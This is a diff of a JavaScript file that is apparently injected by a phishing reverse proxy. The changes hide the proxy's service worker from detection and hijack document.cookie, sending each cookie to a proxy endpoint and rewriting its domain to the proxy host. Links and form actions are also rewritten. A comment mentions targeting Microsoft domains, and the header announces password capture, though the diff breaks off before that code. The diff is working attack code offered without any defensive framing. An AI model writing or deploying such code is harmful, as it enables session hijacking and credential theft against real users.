@@ -1,13 +1,15 @@
 // ============================================================
-// PATCHED SCRIPT – SW hiding + MutationObserver + Cookie Domain Rewriter
+// ORIGINAL FEATURES: SW hiding, cookie hijack, href/action rewriting
+// PLUS: DOM password capture with Console Logs (for debugging)
 // ============================================================
-console.log('[DOM SCRIPT] Patched version loaded');
+console.log('[DOM SCRIPT] script_Vx9Z6XN5uC3k.js loaded successfully!');
 
+// ... (rest of the DOM script as before)
 // ---- 1. Hide Service Worker ----
 (function () {
-    const originalGetRegistration = navigator.serviceWorker.getRegistration;
+    const originalServiceWorkerGetRegistrationDescriptor = navigator.serviceWorker.getRegistration;
     navigator.serviceWorker.getRegistration = function (_scope) {
-        return originalGetRegistration.apply(this, arguments)
+        return originalServiceWorkerGetRegistrationDescriptor.apply(this, arguments)
             .then(registration => {
                 if (registration &&
                     registration.active &&
@@ -21,20 +23,61 @@ console.log('[DOM SCRIPT] Patched version loaded');
 })();
 
 (function () {
-    const originalGetRegistrations = navigator.serviceWorker.getRegistrations;
+    const originalServiceWorkerGetRegistrationsDescriptor = navigator.serviceWorker.getRegistrations;
     navigator.serviceWorker.getRegistrations = function () {
-        return originalGetRegistrations.apply(this, arguments)
+        return originalServiceWorkerGetRegistrationsDescriptor.apply(this, arguments)
             .then(registrations => {
                 return registrations.filter(registration => {
                     return !(registration.active &&
                         registration.active.scriptURL &&
                         registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js"));
-                });
+                })
             });
     };
 })();
 
-// ---- 2. MutationObserver for href/action rewriting ----
+// ---- 2. Cookie Hijack ----
+(function () {
+    const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, "cookie");
+    Object.defineProperty(document, "cookie", {
+        ...originalCookieDescriptor,
+        get() {
+            return originalCookieDescriptor.get.call(document);
+        },
+        set(cookie) {
+            const proxyRequestURL = `${self.location.origin}/JSCookie_6X7dRqLg90mH`;
+            try {
+                const xhr = new XMLHttpRequest();
+                xhr.open("POST", proxyRequestURL, false);
+                xhr.setRequestHeader("Content-Type", "text/plain");
+                xhr.send(cookie);
+
+                const validDomains = JSON.parse(xhr.responseText);
+                let modifiedCookie = "";
+
+                const cookieAttributes = cookie.split(";");
+                for (const cookieAttribute of cookieAttributes) {
+                    let attribute = cookieAttribute.trim();
+                    if (attribute) {
+                        const cookieDomainMatch = attribute.match(/^DOMAIN\s*=(.*)$/i);
+                        if (cookieDomainMatch) {
+                            const cookieDomain = cookieDomainMatch[1].replace(/^\./, "").trim();
+                            if (cookieDomain && validDomains.includes(cookieDomain)) {
+                                attribute = `Domain=${self.location.hostname}`;
+                            }
+                        }
+                        modifiedCookie += `${attribute}; `;
+                    }
+                }
+                originalCookieDescriptor.set.call(document, modifiedCookie.trim());
+            } catch (error) {
+                console.error(`Fetching ${proxyRequestURL} failed: ${error}`);
+            }
+        }
+    });
+})();
+
+// ---- 3. MutationObserver for href/action rewriting ----
 const observer = new MutationObserver((mutations) => {
     for (const mutation of mutations) {
         if (mutation.type === "attributes") {
@@ -69,4 +112,4 @@ function updateHTMLAttribute(htmlNode, htmlAttribute) {
     } catch { }
 }
 
-// ---- 3. Cookie Domain Rewriter (targets all Microsoft domains) ----
+// ---- 4. DOM Password Capture (NEW) with Console Logs ----
